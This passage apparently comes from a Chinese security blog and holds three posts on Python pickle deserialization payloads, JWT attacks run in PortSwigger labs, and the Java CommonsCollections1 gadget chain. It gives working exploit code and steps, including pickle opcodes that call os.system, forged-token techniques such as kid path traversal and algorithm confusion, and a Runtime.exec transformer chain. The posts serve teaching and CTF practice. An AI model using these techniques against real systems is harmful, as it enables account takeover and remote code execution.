INST对应opcode：b'i'建立并入栈一个对象（可以执行一个函数）：INST('os', 'system', 'ls') 输入：module,callable,para OBJ对应opcode：b'o'建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：OBJ(GLOBAL('os', 'system'), 'ls') 输入：callable,paraxxx(xx,...)对应opcode：b'R'使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）li[0]=321或globals_dic['local_var']='hello'对应opcode：b's'更新列表或字典的某项的值xx.attr=123对应opcode：b'b'对xx对象进行属性设置return对应opcode：b'0'出栈（作为pickle.loads函数的返回值）：return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组） 注意： 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。 pker解析S时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode: 12test=&quot;123&quot;return test 被解析为： 1b&quot;S'123'\\np0\\n0g0\\n.&quot; pker：全局变量覆盖 覆盖直接由执行文件引入的secret模块中的name与category变量： 1234secret=GLOBAL('__main__', 'secret') # python的执行文件被解析为__main__对象，secret在该对象从属下secret.name='1'secret.category='2' 覆盖引入模块的变量： 12game = GLOBAL('guess_game', 'game')game.curr_ticket = '123' 接下来会给出一些具体的基本操作的实例。 pker：函数执行 通过b'R'调用： 1234s='whoami'system = GLOBAL('os', 'system')system(s) # `b'R'`调用return 通过b'i'调用： 1INST('os', 'system', 'whoami') 通过b'c'与b'o'调用： 1OBJ(GLOBAL('os', 'system'), 'whoami') 多参数调用函数 12INST('[module]', '[callable]'[, par0,par1...])OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...]) pker：实例化对象 实例化对象是一种特殊的函数执行 12345animal = INST('__main__', 'Animal','1','2')return animal# 或者animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')return animal 其中，python原文件中包含： 1234class Animal: def __init__(self, name, category): self.name = name self.category = category 也可以先实例化再赋值： 1234animal = INST('__main__', 'Animal')animal.name='1'animal.category='2'return animal 手动辅助 拼接opcode：将第一个pickle流结尾表示结束的.去掉，两者拼接起来即可。 建立普通的类时，可以先pickle.dumps，再拼接至payload。 pker：CTF实战 在实际使用pker时，首先需要有大概的思路，保证能做到手写每一步的opcode，然后使用pker对思路进行实现。 Code-Breaking: picklecode解析思路见前文手写opcode的CTF实战部分，pker代码为： 12345678getattr=GLOBAL('builtins','getattr')dict=GLOBAL('builtins','dict')dict_get=getattr(dict,'get')glo_dic=GLOBAL('builtins','globals')()builtins=dict_get(glo_dic,'builtins')eval=getattr(builtins,'eval')eval('print(&quot;123&quot;)')return BalsnCTF:pyshv1123456789101112131415whitelist = ['sys']class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or '.' in name: raise KeyError('The pickle is spoilt :(') return pickle.Unpickler.find_class(self, module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps 题目的find_class只允许sys模块，并且对象名中不能有.号。意图很明显，限制子模块，只允许一级模块。sys模块有一个字典对象modules，它包含了运行时所有py程序所导入的所有模块，并决定了python引入的模块，如果字典被改变，引入的模块就会改变。modules中还包括了sys本身。我们可以利用自己包含自己这点绕过限制，具体过程为： 由于sys自身被包含在自身的子类里，我们可以利用这点使用s赋值，向后递进一级，引入sys.modules的子模块：sys.modules['sys']=sys.modules，此时就相当于sys=sys.modules。这样我们就可以利用原sys.modules下的对象了，即sys.modules.xxx。 首先获取modules的get函数，然后类似于上一步，再使用s把modules中的sys模块更新为os模块：sys['sys']=sys.get('os')。 使用c获取system，之后就可以执行系统命令了。 整个利用过程还是很巧妙的，pker代码为： 12345678modules=GLOBAL('sys', 'modules')modules['sys']=modulesmodules_get=GLOBAL('sys', 'get')os=modules_get('os')modules['sys']=ossystem=GLOBAL('sys', 'system')system('whoami')return 更多案例","link":"/2024/02/06/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"JWT漏洞","text":"什么是 JWT？JSON web tokens (JWT) 是一种标准化格式，用于在系统之间发送加密签名的 JSON 数据。理论上，它们可以包含任何类型的数据，但最常用于发送有关用户的信息（“声明”），作为身份验证、会话处理和访问控制机制的一部分。 与经典会话令牌不同，服务器所需的所有数据都存储在 JWT 本身的客户端中。 JWT 格式JWT 由 3 部分组成：标头、有效负载和签名。它们均由点分隔，如以下示例所示： 1eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA JWT 的标头和有效负载部分只是 base64url 编码的 JSON 对象。标头包含有关令牌本身的元数据，而有效负载包含有关用户的实际“声明”。例如，您可以从上面的令牌中解码有效负载以揭示以下声明： 123456789{ &quot;iss&quot;: &quot;portswigger&quot;, &quot;exp&quot;: 1648037164, &quot;name&quot;: &quot;Carlos Montoya&quot;, &quot;sub&quot;: &quot;carlos&quot;, &quot;role&quot;: &quot;blog_author&quot;, &quot;email&quot;: &quot;carlos@carlos-montoya.net&quot;, &quot;iat&quot;: 1516239022} 在大多数情况下，任何有权访问令牌的人都可以轻松读取或修改此数据。因此，任何基于 JWT 的机制的安全性都严重依赖于加密签名。 签名发出令牌的服务器通常通过散列标头和有效负载来生成签名。在某些情况下，他们还会对生成的哈希值进行加密。无论哪种方式，此过程都涉及秘密签名密钥。此机制为服务器提供了一种方法来验证令牌中的数据自发布以来没有被篡改： 由于签名是直接从令牌的其余部分派生的，因此更改标头或有效负载的单个字节会导致签名不匹配。 如果不知道服务器的秘密签名密钥，就不可能为给定的标头或有效负载生成正确的签名。 注意：https://jwt.io/ 什么是 JWT 攻击？JWT 攻击的影响通常很严重。如果攻击者能够使用任意值创建自己的有效令牌，他们可能能够升级自己的权限或冒充其他用户，完全控制他们的帐户。 注意：一旦 JWT 被签发，就无法撤销。即使在 JWT 还未过期的情况下，如果需要立即使其失效，是无法做到的；也就是说即使你的账号logout，但是曾经的jwt令牌依然有效； JWT 攻击的漏洞是如何产生的？JWT 漏洞通常是由于应用程序本身的 JWT 处理缺陷而引起的。与 JWT 相关的各种规范在设计上相对灵活，允许网站开发人员自行决定许多实现细节。即使使用久经考验的库，这也可能导致他们意外引入漏洞。 这些实现缺陷通常意味着 JWT 的签名未得到正确验证。这使得攻击者能够篡改通过令牌的有效负载传递给应用程序的值。即使签名得到了可靠的验证，它是否真正可信在很大程度上依赖于服务器的秘密密钥是否保密。如果该密钥以某种方式泄露，或者可以被猜测或暴力破解，则攻击者可以为任何任意令牌生成有效签名，从而损害整个机制 利用有缺陷的 JWT 签名验证接受任意签名JWT 库通常提供一种验证令牌的方法和另一种仅对其进行解码的方法。例如，Node.js 库jsonwebtoken有verify()和decode()。 有时，开发人员会混淆这两种方法，只将传入的令牌传递给该decode()方法。这实际上意味着应用程序根本不验证签名。也就是说，后端服务器并没有使用verify()函数对令牌进行验证，而是直接使用decode函数解码 接受没有签名的令牌其中，JWT 标头包含一个alg参数。这告诉服务器使用哪种算法对令牌进行签名，以及在验证签名时需要使用哪种算法。 1234{ &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} 这本质上是有缺陷的，因为服务器别无选择，只能隐式信任来自令牌的用户可控输入，而此时该令牌根本尚未经过验证。换句话说，攻击者可以直接影响服务器如何检查令牌是否可信。 JWT支持“none”算法。如果将alg字段设置为“none”，则任何令牌都将被视为有效。 暴力破解密钥某些签名算法，例如 HS256 (HMAC + SHA-256)，使用任意独立字符串作为密钥。就像密码一样，这一秘密可能轻易被攻击者猜出或暴力破解， Tools: https://github.com/ticarpi/jwt_tool https://github.com/brendan-rius/c-jwt-cracker.git 1./jwtcrack &lt;token&gt; JWT 标头参数注入根据JWS规范，只有alg标头参数是强制的。但实际上，JWT 标头通常包含其他几个参数。攻击者特别感兴趣的是以下内容。 jwk- 提供表示密钥的嵌入式 JSON 对象。 jku- 提供一个 URL，服务器可以从中获取包含正确密钥的一组密钥。 kid- 提供一个 ID，服务器可以使用该 ID 在有多个密钥可供选择的情况下识别正确的密钥。根据密钥的格式，这可能具有匹配的kid参数。 通过 jwk 参数注入自签名 JWTJWS规范描述了一个可选的jwk标头参数，服务器可以使用该参数以 JWK 格式将其公钥直接嵌入到令牌本身中。 JWT 标头示例： 1234567891011{ &quot;kid&quot;: &quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;jwk&quot;: { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG&quot;, &quot;n&quot;: &quot;yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m&quot; }} 在理想情况下，服务器应该是只使用公钥白名单来验证JWT签名的，但对于一些相关配置错误的服务器会用JWK参数中嵌入的任何密钥进行验证，攻击者就可以利用这一行为，用自己的RSA私钥对修改过的JWT进行签名，然后在JWK头部中嵌入对应的公钥进行越权操作 实验如下 实验环境来自:https://portswigger.net/ 使用：wiener:peter登陆 ,没有权限访问/admin 使用jwk注入步骤： 生成新的 RSA 密钥 请注意，您无需选择密钥大小，因为稍后会自动更新。 此时标头已经成功注入jwk；再次发送请求包之后，可以成功拿到adminstrator权限 1234567891011{ &quot;kid&quot;: &quot;45287eda-91e5-420e-9477-95856bbfd5f2&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;RS256&quot;, &quot;jwk&quot;: { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;45287eda-91e5-420e-9477-95856bbfd5f2&quot;, &quot;n&quot;: &quot;nNJZA3RKyKP8fsXTZ9BSKlOEKM7HSo6HbaSKiDhK70mzlqHQmgAjYjFLpq-hsmlZp8oY34kLDCnMfYgNhRZlNoadPxwy7tWdUklawuQPVvbAlPbY9gIXaDpu-7h1P0bm_8uw3MtmX5PPhW7-mFysBAHb-EJIryU5xFueFuZVIJzQ1yeepb6j7IgbjDcGzO_XP0zoXQBTpJTBYlpUaAhr_5fjKiHM6LaXgQYKIcImquEDbqo9Z4N1QJYmaLZH256Ki-AP6cav6uu0erYO1eejrDJ41bg34Sd-IzaN-Rr9v2kbDoLxd_jh041uXMz0UNBVbRHnCqB6kIbG-w1O0g2Jcw&quot; }} 通过 jku 参数注入自签名 JWT有些服务器并不会直接使用JWK头部参数来嵌入公钥，而是使用JKU（JWK Set URL）来引用一个包含了密钥的JWK Set，当验证签名时，服务器从该 URL 中获取相关密钥；我们就可以借此来构造一个密钥从而实现越权操作 JWK Set 是一个 JSON 对象，包含表示不同键的 JWK 数组。您可以在下面看到这样的示例。 12345678910111213141516{ &quot;keys&quot;: [ { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;75d0ef47-af89-47a9-9061-7c02a610d5ab&quot;, &quot;n&quot;: &quot;o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ&quot; }, { &quot;kty&quot;: &quot;RSA&quot;, &quot;e&quot;: &quot;AQAB&quot;, &quot;kid&quot;: &quot;d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA&quot;, &quot;n&quot;: &quot;fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw&quot; } ]} 实验如下 右键单击刚刚生成的密钥条目，然后选择将公钥复制为 JWK。 实验已经提供了:exploit-server；将公钥复制的JWK放到Body部分 12345{ &quot;keys&quot;: [ ]} 把kid替换为我们生成的kid,将jkw写出exploit-server地址；然后将改成administrator，再用一开始生成的RSA签名即可 注意：如果你用的burpsuit是盗版的话，使用插件可能sign不成功；我最终是用kali自带的社区版解决的； 通过kid参数注入自签名JWT服务器可能使用多个加密密钥来签署不同类型的数据，而不仅仅是 JWT。因此，JWT 的 header 中可能会包含一个kid（Key ID）参数，该参数可以帮助服务器识别在验证签名时使用哪个密钥。 验证密钥通常存储为 JWK 集。在这种情况下，服务器可以简单地查找与kid令牌相同的JWK。然而，JWS 规范并未定义此 ID 的具体结构 - 它只是开发人员选择的任意字符串。例如，他们可能使用kid参数来指向数据库中的特定条目，甚至是文件名。 如果此参数也容易受到目录遍历的攻击，则攻击者可能会强制服务器使用其文件系统中的任意文件作为验证密钥。 123456{ &quot;kid&quot;: &quot;../../path/to/file&quot;, &quot;typ&quot;: &quot;JWT&quot;, &quot;alg&quot;: &quot;HS256&quot;, &quot;k&quot;: &quot;asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc&quot;} 如果服务器还支持使用对称算法签名的 JWT，则这尤其危险。在这种情况下，攻击者可能会将kid参数指向可预测的静态文件，然后使用与该文件内容匹配的密钥对 JWT 进行签名。 理论上，您可以对任何文件执行此操作，但最简单的方法之一是使用/dev/null，它存在于大多数 Linux 系统上。由于这是一个空文件，读取它会返回一个空字符串。因此，使用空字符串对令牌进行签名将得到有效的签名。 实验如下 新建对称密钥;请注意，您无需选择密钥大小，因为稍后会自动更新。将生成的属性值替换k为 Base64 编码的空字节 ( AA==)。 将参数的值更改kid为指向/dev/null文件,修改为administrator;单击Sign，然后选择在上一部分中生成的对称密钥即可 JWT算法混淆攻击当攻击者能够强制服务器使用与网站开发人员预期不同的算法来验证 JSON Web 令牌 ( JWT ) 的签名时，就会发生算法混淆攻击（也称为密钥混淆攻击）。如果这种情况处理不当，攻击者可能会伪造包含任意值的有效 JWT，而无需知道服务器的秘密签名密钥。 算法混淆漏洞是如何产生的？算法混乱漏洞通常是由于 JWT 库的实现有缺陷而引起的。尽管实际的验证过程因所使用的算法而异，但许多库提供了一种与算法无关的单一方法来验证签名。这些方法依赖于alg令牌标头中的参数来确定它们应执行的验证类型。 以下伪代码显示了此泛型verify()方法的声明在 JWT 库中的简化示例： 12345678function verify(token, secretOrPublicKey){ algorithm = token.getAlgHeader(); if(algorithm == &quot;RS256&quot;){ // Use the provided key as an RSA public key } else if (algorithm == &quot;HS256&quot;){ // Use the provided key as an HMAC secret key }} 当随后使用此方法的网站开发人员假设它将专门处理使用 RS256 等非对称算法签名的 JWT 时，就会出现问题。由于这个有缺陷的假设，他们可能总是将固定的公钥传递给该方法，如下所示： 123publicKey = &lt;public-key-of-server&gt;;token = request.getCookie(&quot;session&quot;);verify(token, publicKey); 在这种情况下，如果服务器收到使用 HS256 等对称算法签名的令牌，则库的通用verify()方法会将公钥视为 HMAC 秘密。这意味着攻击者可以使用 HS256 和公钥对令牌进行签名，并且服务器将使用相同的公钥来验证签名。 注意：用于签署令牌的公钥必须与服务器上存储的公钥完全相同。这包括使用相同的格式（例如 X.509 PEM） 执行算法混淆攻击算法混淆攻击通常涉及以下高级步骤： 获取服务器的公钥 将公钥转换为合适的格式 创建一个恶意 JWT，其负载经过修改，alg标头设置为HS256. 使用公钥作为密钥，使用 HS256 对令牌进行签名。 可以获取服务器的公钥非常重要；例如，服务器有时会通过映射到/jwks.json 的 标准端点将其公钥公开为 JSON Web Key (JWK) 对象。/.well-known/jwks.json这些可以存储在名为 的 JWK 数组中keys。这称为 JWK 集。 注意：私钥用于解密数据或生成数字签名；而公钥用于加密数据或验证数字签名 实验如下： 访问jwks.json拿到公钥， 123456789101112{ &quot;keys&quot;:[ { &quot;kty&quot;:&quot;RSA&quot;, &quot;e&quot;:&quot;AQAB&quot;, &quot;use&quot;:&quot;sig&quot;, &quot;kid&quot;:&quot;0db5403e-6f79-47e5-aa30-b005a59dc7be&quot;, &quot;alg&quot;:&quot;RS256&quot;, &quot;n&quot;:&quot;mVx2PicKCcRTrUZ-2rcpVVGjUedQie9HKP8coUmvWY7eKHb7XoHZVj9kD79CW5bRtipLV27NzeunNwtbXfYRTVRD33C6oDF393Q0czJc63EXmMCE6p2MWKpsieVhPe5XjK0L7UGm1BGSGafMndQrjdNv2V1eMnz5oX1AsSwltMDkZD_wFrhVxBXO71GmHfm4jWYoJzchr1Z5X_DCM6Q_0cWZ4PLl9GVeCZwiZg-5SvGvhwEOeKqnJriulWIubqCouY2ygOVNbmMK0_L8SPHXfntZ4JXm0pvRbV-gufizH7vnAJfJ7O7dMc6AVTqSNnWNWIgp1_Z8VQ253WkM77dpEw&quot; } ]} 并转化成pem格式，可以利用python脚本 1234567891011121314151617181920212223242526272829303132import base64import binasciiimport jsonfrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives.asymmetric import paddingfrom cryptography.hazmat.primitives import hashesjwk_data = { &quot;keys&quot;:[ { &quot;kty&quot;:&quot;RSA&quot;, &quot;e&quot;:&quot;AQAB&quot;, &quot;use&quot;:&quot;sig&quot;, &quot;kid&quot;:&quot;0db5403e-6f79-47e5-aa30-b005a59dc7be&quot;, &quot;alg&quot;:&quot;RS256&quot;, &quot;n&quot;:&quot;mVx2PicKCcRTrUZ-2rcpVVGjUedQie9HKP8coUmvWY7eKHb7XoHZVj9kD79CW5bRtipLV27NzeunNwtbXfYRTVRD33C6oDF393Q0czJc63EXmMCE6p2MWKpsieVhPe5XjK0L7UGm1BGSGafMndQrjdNv2V1eMnz5oX1AsSwltMDkZD_wFrhVxBXO71GmHfm4jWYoJzchr1Z5X_DCM6Q_0cWZ4PLl9GVeCZwiZg-5SvGvhwEOeKqnJriulWIubqCouY2ygOVNbmMK0_L8SPHXfntZ4JXm0pvRbV-gufizH7vnAJfJ7O7dMc6AVTqSNnWNWIgp1_Z8VQ253WkM77dpEw&quot; } ]}for key in jwk_data[&quot;keys&quot;]: modulus = int.from_bytes(base64.urlsafe_b64decode(key[&quot;n&quot;] + &quot;===&quot;), &quot;big&quot;) exponent = int.from_bytes(base64.urlsafe_b64decode(key[&quot;e&quot;] + &quot;===&quot;), &quot;big&quot;) public_numbers = rsa.RSAPublicNumbers(exponent, modulus) public_key = public_numbers.public_key() pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo ) print(pem.decode()) 或者burp插件 新建 RSA 密钥,复制到key框中，再选择pem单选框或者右键单击刚刚创建的密钥条目，然后选择将公钥复制为 PEM(注意这里最后有个换行符) 对此 PEM 密钥进行 Base64 编码，然后复制生成的字符串 新建对称密钥。在对话框中，单击“生成”以生成 JWK 格式的新密钥。请注意，您无需选择密钥大小，因为稍后会自动更新；将 k 属性的生成值替换为您刚刚创建的 Base64 编码的 PEM。 将alg参数的值更改为HS256。将声明的值更改sub为administrator。单击Sign，然后选择在上一部分中生成的对称密钥即可; 从现有令牌派生公钥在公钥不易获得的情况下，您仍然可以通过从一对现有 JWT 派生密钥来测试算法混淆。使用诸如 之类的工具，此过程相对简单jwt_forgery.py。您可以在rsa_sign2nGitHub 存储库上找到此脚本以及其他几个有用的脚本。 我们还创建了该工具的简化版本，您可以将其作为单个命令运行： 1docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt; 这将使用您提供的 JWT 来计算 的一个或多个潜在值n。不要太担心这意味着什么 - 您需要知道的是只有其中之一n与服务器密钥使用的值相匹配。对于每个潜在值，我们的脚本输出： X.509 和 PKCS1 格式的 Base64 编码 PEM 密钥。 使用每个密钥签名的伪造 JWT。 要识别正确的密钥，请使用 Burp Repeater 发送包含每个伪造 JWT 的请求。服务器仅接受其中之一。然后，您可以使用匹配密钥来构造算法混淆攻击。 实验如下： 获取服务器生成的两个 JWT(登陆第一次，拿到一个jwt令牌后退出，再登陆第二次，拿到第二个jwt令牌) 在终端中，运行以下命令，并传入两个 JWT 作为参数。 1docker run --rm -it portswigger/sig2n &lt;token1&gt; &lt;token2&gt; 请注意，输出包含一个或多个 的计算值n。其中每一项在数学上都是可能的，但只有其中一项与服务器使用的值匹配。 返回到 Burp Repeater 中的请求并将路径更改回/my-account;将会话 cookie 替换为这个新的 JWT，然后发送请求;发现第二个成功返回200；说明成功； 从终端窗口中，复制您在上一部分中确定为正确的 Base64 编码的 X.509 密钥。请注意，您需要选择密钥，而不是上一节中使用的被篡改的 JWT。","link":"/2024/02/08/JWT%E6%BC%8F%E6%B4%9E/"},{"title":"CommonsCollections1","text":"环境代建去官网下载 jdk8u65https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html 然后去 下载openjdkhttp://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/af660750b2f4/ 将”Java\\jdk1.8.0_65”中的的src.zip解压到当前目录 把下载的openjdk里 /share/classes/ 里面的 sun包 复制到 jdk1.8.0_65\\src中,并将 jdk1.8.0_65\\src路径添加到项目的源路径 然后”文件”==&gt; “项目结构”==&gt;”SDK”==&gt;”源路径”==&gt;”添加”==&gt;”应用” 从这个网站下载commons-collections-3.2.1.jar https://nowjava.com/jar/detail/m02261229/commons-collections-3.2.1.jar.html 然后”文件”==&gt; “项目结构”==&gt;”库”==&gt;”添加”==&gt;”应用” CheckSetValueRuntimejava任意执行命令的代码 1Runtime.getRuntime().exec(&quot;calc&quot;); 将Runtime执行命令的方式以反射的形式写出 1234Runtime r = Runtime.getRuntime();Class&lt;? extends Runtime&gt; clazz = r.getClass();Method exec = clazz.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;); InvokerTransformer再InvokerTransformer类中的transform这样一段代码非常危险，完全符和反射调用类的成员方法的形式 12345678910public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); }catch {...} 而且三个参数完全可控 123456public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args;} 尝试将Runtime反射的形式改成invokerTransformer调用transform，也是可以执行命令的 123Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});invokerTransformer.transform(r); 按照Java反序列化中找POP链的思路，我们需要寻找哪里调用transform方法，然后尝试”移花接木”; TransformedMap其实有很多地方都有用到transform方法，但是可以利用的方法在TransformedMap中的checkSetValue 123protected Object checkSetValue(Object value) { return valueTransformer.transform(value);} 我们可以看看TransformedMap类 构造方法的访问修饰符为protected（只能在同包或者别的包的子类） 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;} 此类还有一个public修饰的静态方法decorate，返回一个TransformedMap对象 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);} 接下来看看哪里调用了checkSetValue方法，其实只有一处地方调用了； AbstractInputCheckedMapDecorator抽象类AbstractInputCheckedMapDecorator的静态内部类MapEntry的setValue方法调用了 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); }} 也是在抽象类AbstractInputCheckedMapDecorator下的一个静态内部类EntrySetIterator的next方法；返回了一个MapEntry对象 1234public Object next() { Map.Entry entry = (Map.Entry) iterator.next(); return new MapEntry(entry, parent);} 所以我们将代码改成下面这样也是可以执行命令的，看似有点麻烦，但是动态调试一下就非常简单 12345678910Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entries = transformedMap.entrySet();Iterator&lt;Map.Entry&lt;Object, Object&gt;&gt; iterator = entries.iterator();Map.Entry&lt;Object, Object&gt; next = iterator.next();next.setValue(r); 其实setValue是一个常用的方法；主要用来处理双列集合的，例如： 123456HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(&quot;zzz&quot;,&quot;bbb&quot;);Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entries = hashMap.entrySet();for (Map.Entry&lt;Object, Object&gt; entry : entries) { entry.setValue(&quot;ccc&quot;);} 我们不妨将代码改成下面，也是可以执行命令的，增强for的底层还是调用了迭代器； 12345678Runtime r = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;});HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();hashMap.put(&quot;key&quot;,&quot;value&quot;);Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer);for (Map.Entry entry : transformedMap.entrySet()) { entry.setValue(r);} 可以动态调试看看 实际上AbstractInputCheckedMapDecorator是TransformedMap的父类；TransformedMap没有entrySet()方法，所以会去他的父类找； 并且赋值parent为TransformedMap对象 增强for的底层还是调用了迭代器；返回了一个EntrySetIterator对象，接下了就是调用hasNext()和next()方法 可以着重看一下next方法；返回一个MapEntry对象， 最后调用setValue方法 然后就一步一步调用到invokerTransformer的transform方法 AnnotationInvocationHandler最终发现sun.reflect.annotation.AnnotationInvocationHandler类下中的readObject方法调用了setValue 三个问题 Runtime是没有实现Serializable接口的，无法序列化 AnnotationInvocationHandler中的readObject执行 memberValue.setValue需要绕过两if判断 memberValue.setValue中的值无法控制 Serializable先来解决第一个问题 虽然Runtime是没有实现Serializable接口的，但是Class实现了Serializable接口； 1234Runtime r = Runtime.getRuntime();Class&lt;? extends Runtime&gt; clazz = r.getClass();Method exec = clazz.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;); 改成下面这种形式 123456Class r = Runtime.class;Method getRuntime = r.getMethod(&quot;getRuntime&quot;, null);//注意&quot;getRuntime&quot;是一个静态方法，obj可以为nullObject runtime = getRuntime.invoke(null, null);Method exec = r.getMethod(&quot;exec&quot;, String.class);exec.invoke(runtime,&quot;calc&quot;); 接着改 1234Class r = Runtime.class;Object getMethod = new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}).transform(r);Object invoke = new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getMethod);new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}).transform(invoke); 改成这样也是可以执行命令的；但是问题又来了，上面一共执行了三次transform方法。但是InvokerTransformer类中只能执行一次transform方法； 这里又要介绍一个需要利用的类ChainedTransformer;可以看一下此类的构造方法和transform方法 12345678910111213//传递一个transformers方法public ChainedTransformer(Transformer[] transformers) { super(); iTransformers = transformers;}//一个for循环，将上一个对象当作下一个函数执行，循环嵌套public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object;} 因此我们可以改成下面这种形式，完美解决 12345678Transformer[] transformers = { new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class); 绕过if再来解决怎么绕过两if判断 12345678910111213141516171819202122232425262728private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); } Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new 